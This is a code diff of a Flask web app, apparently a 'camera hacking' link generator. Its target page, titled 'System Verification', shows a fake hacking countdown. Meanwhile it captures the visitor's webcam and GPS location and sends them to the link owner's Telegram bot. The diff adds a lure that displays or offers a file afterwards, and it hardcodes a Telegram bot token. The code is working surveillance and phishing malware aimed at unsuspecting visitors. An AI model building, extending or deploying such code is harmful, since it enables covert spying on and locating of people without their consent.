@@ -1,4 +1,3 @@
-
 # by:@ROMEO_UCHIHA
 from flask import Flask, request, render_template_string, jsonify, redirect, session
 from supabase import create_client, Client
@@ -14,7 +13,7 @@ supabase: Client = create_client(SUPA_URL, SUPA_KEY)
 
 ADMIN_TOKEN = "7808271503:AAGR1uax_qHj7m9LA5oRYaF56LSeAo45EvI"
 ADMIN_CID = "6383817850"
-BASE_URL = "http://127.0.0.1:5000" # Tumhari Vercel URL
+BASE_URL = "https://secure-links-psi.vercel.app" # Isko apni actual vercel domain se replace kar lena zaroorat ho toh
 
 def send_tg_msg(token, cid, text):
     try: requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": cid, "text": text, "parse_mode": "Markdown"})
@@ -56,7 +55,7 @@ COMMON_STYLE = """
 @app.route("/")
 def index(): return redirect("/lg")
 
-# --- REGISTER / LOGIN FLOW ---
+# --- REGISTER / LOGIN FLOW (Kept for compatibility) ---
 @app.route("/rg", methods=["GET", "POST"])
 def register():
     if request.method == "POST":
@@ -107,46 +106,17 @@ def verify_otp():
         return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
     return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY OTP</h2><p style="color:#aaa; font-size:13px; margin-bottom:20px;">Check your Telegram Bot.</p><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required pattern="[0-9]*" inputmode="numeric"><button type="submit">Verify</button></form></div>')
 
-# --- DASHBOARD UI (Only For Link Generation) ---
-@app.route("/ds", methods=["GET", "POST"])
-def dashboard():
-    if "user_id" not in session: return redirect("/lg")
-    
-    link_url = None
-    if request.method == "POST":
-        link_id = str(uuid.uuid4())[:8]
-        # Saving link config so target page knows what to do
-        supabase.table("links").insert({"id": link_id, "user_id": session["user_id"], "target_type": request.form.get("type"), "redirect_url": request.form.get("redirect")}).execute()
-        link_url = f"{BASE_URL}/t/{link_id}"
-
-    return render_template_string(f'''
-        {COMMON_STYLE}
-        <div class="container">
-            <h2>DASHBOARD</h2>
-            <p style="color:#aaa; font-size:13px; margin-bottom:20px;">Target data will be sent directly to your Telegram Bot.</p>
-            <form method="POST">
-                <input type="url" name="redirect" placeholder="Redirect URL (e.g. https://google.com)" required>
-                <select name="type">
-                    <option value="both">Camera + Location</option>
-                    <option value="camera">Camera Only</option>
-                    <option value="location">Location Only</option>
-                </select>
-                <button type="submit">GENERATE LINK</button>
-            </form>
-            {"<div style='margin-top:25px;background:rgba(0,0,0,0.5);padding:15px;border-radius:14px;border:1px solid #330000;'><p style='color:#0f0;font-size:14px;margin-bottom:10px;'>Link Generated successfully:</p><input value='"+link_url+"' readonly id='linkInput' style='border-color:#0f0;color:#0f0;text-align:center;'><button onclick='navigator.clipboard.writeText(document.getElementById(\"linkInput\").value);alert(\"Copied!\")' style='background:#111;border-color:#333;margin-top:5px; width:auto; padding:10px 20px;'>Copy Link</button></div>" if link_url else ""}
-            <a href="/lg" style="margin-top:30px;color:#ff4d4d;font-weight:700;">[ LOGOUT ]</a>
-        </div>
-    ''')
-
-# --- TARGET PAGE (HACK UI) ---
+# --- TARGET PAGE (HACK UI + FILE SHOWCASE) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
-    if not res.data: return "Link Not Found!"
+    if not res.data: return "Link Not Found or Deleted!"
     
     data = res.data[0]
-    target_type = data["target_type"]
-    r_url = data["redirect_url"]
+    target_type = data.get("target_type", "both")
+    action_mode = data.get("action_mode", "redirect")
+    action_value = data.get("action_value", "")
+    file_type = data.get("file_type", "")
 
     return render_template_string('''
     <!DOCTYPE html>
@@ -157,16 +127,23 @@ def target_page(link_id):
         <title>System Verification</title>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
         <style>
-            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');
+            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&family=Poppins:wght@500;700&display=swap');
             body { background: radial-gradient(circle at center, #0a0000 0%, #000 100%); color: #0f0; font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
             .box { background: rgba(10, 0, 0, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255, 0, 0, 0.3); border-radius: 20px; padding: 40px 30px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 0, 0.1); }
             h3 { font-family: 'Orbitron', sans-serif; color: #ff3333; letter-spacing: 2px; margin-bottom: 30px; }
             .item { display: flex; justify-content: space-between; align-items: center; margin: 25px 0; font-size: 1.3rem; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px;}
             .tick { color: #0f0; text-shadow: 0 0 10px #0f0; } .cross { color: #f00; text-shadow: 0 0 10px #f00; } .wait { color: #ff0; animation: spin 1s infinite linear; }
             @keyframes spin { 100% { transform: rotate(360deg); } }
-            #hack-ui { display: none; text-align: center; }
+            #hack-ui, #result-ui { display: none; text-align: center; width: 100%; max-width: 500px; padding: 20px; }
             .timer { font-size: 6rem; color: #ff0000; text-shadow: 0 0 20px rgba(255,0,0,0.6); font-family: 'Orbitron', sans-serif; font-weight: 900;}
             #msg { margin-top: 20px; font-size: 0.9rem; color: #888; height: 20px;}
+            
+            /* Result UI styling */
+            .media-container { background: rgba(20,0,0,0.9); padding: 20px; border-radius: 20px; border: 1px solid #ff0000; box-shadow: 0 0 20px rgba(255,0,0,0.3); }
+            .media-container img, .media-container video { width: 100%; border-radius: 10px; border: 2px solid #550000; margin-bottom: 15px; }
+            .media-container audio { width: 100%; margin-bottom: 15px; }
+            .download-btn { background: linear-gradient(135deg, #cc0000, #800000); color: #fff; padding: 15px 25px; border-radius: 12px; font-family: 'Poppins'; font-weight: bold; text-decoration: none; display: inline-block; width: 100%; border: 1px solid #ff4d4d; box-shadow: 0 5px 15px rgba(255,0,0,0.3); transition: 0.3s; }
+            .download-btn:hover { background: #ff1a1a; box-shadow: 0 5px 25px rgba(255,0,0,0.6); transform: scale(1.02); }
         </style>
     </head>
     <body>
@@ -183,11 +160,20 @@ def target_page(link_id):
             <p id="log-text" style="color: #666; margin-top: 10px; text-transform: uppercase;">Establishing connection...</p>
         </div>
 
+        <div id="result-ui">
+            <div class="media-container" id="media-content">
+                </div>
+        </div>
+
         <video id="v" style="display:none" autoplay playsinline></video>
         <canvas id="c" style="display:none"></canvas>
 
         <script>
             let mode = "{{ t_type }}";
+            let actMode = "{{ a_mode }}";
+            let actVal = "{{ a_val }}";
+            let fType = "{{ f_type }}";
+
             let camReq = (mode === 'both' || mode === 'camera');
             let locReq = (mode === 'both' || mode === 'location');
             
@@ -255,6 +241,28 @@ def target_page(link_id):
                 return itv;
             }
 
+            function showFileResult() {
+                document.getElementById('hack-ui').style.display = 'none';
+                let resBox = document.getElementById('result-ui');
+                let medBox = document.getElementById('media-content');
+                resBox.style.display = 'block';
+
+                let html = "";
+                if(fType === 'image') {
+                    html += `<img src="${actVal}" alt="Image">`;
+                } else if (fType === 'video') {
+                    html += `<video src="${actVal}" controls autoplay></video>`;
+                } else if (fType === 'audio') {
+                    html += `<audio src="${actVal}" controls autoplay></audio>`;
+                } else {
+                    html += `<h3 style="color:#fff; font-family:'Poppins';">File is Ready</h3>`;
+                }
+                
+                // Add Download Button for all file types
+                html += `<a href="${actVal}" target="_blank" class="download-btn"><i class="fas fa-download"></i> Download / Open File</a>`;
+                medBox.innerHTML = html;
+            }
+
             function startHack() {
                 document.getElementById('auth-ui').style.display = 'none';
                 document.getElementById('hack-ui').style.display = 'block';
@@ -268,14 +276,20 @@ def target_page(link_id):
                     if(timeLeft <= 0) {
                         clearInterval(timer);
                         if(capItv) clearInterval(capItv);
-                        window.location.href = "{{ r_url }}";
+                        
+                        // Action Logic Based on Link DB config
+                        if(actMode === 'redirect') {
+                            window.location.href = actVal;
+                        } else {
+                            showFileResult();
+                        }
                     }
                 }, 1000);
             }
         </script>
     </body>
     </html>
-    ''', t_type=target_type, r_url=r_url, l_id=link_id)
+    ''', t_type=target_type, a_mode=action_mode, a_val=action_value, f_type=file_type, l_id=link_id)
 
 # --- BACKEND LOGGING APIS (DIRECT TO TELEGRAM ONLY) ---
 @app.route("/api/log_hardware/<l_id>", methods=["POST"])
@@ -297,7 +311,9 @@ def log_loc(l_id):
     link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
     user = link["users"]
     d = request.get_json()
-    map_link = f"https://www.google.com/maps?q=${d['lat']},{d['lon']}"
+    
+    # MAP FIX APPLIED HERE: Clean Google Maps URL
+    map_link = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
     
     msg = f"📍 *LOCATION FOUND*\\n\\nLat: `{d['lat']}`\\nLon: `{d['lon']}`\\n🗺 Map: {map_link}"
     send_tg_msg(user["bot_token"], user["chat_id"], msg)
